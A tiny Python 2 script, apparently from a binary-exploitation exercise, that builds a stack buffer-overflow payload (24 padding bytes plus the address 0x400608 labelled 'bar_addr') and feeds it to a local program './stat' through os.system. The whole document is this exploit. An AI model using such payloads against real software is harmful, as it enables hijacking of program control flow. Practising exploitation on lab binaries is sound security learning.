import os

arg = "aaaaaaaaaaaaaaaa" + "aaaaaaaa"
bar_addr = ['\x08', '\x06', '\x40']
arg2 = arg + bar_addr[0]+bar_addr[1]+bar_addr[2]
print arg2
os.system("./stat " + arg2)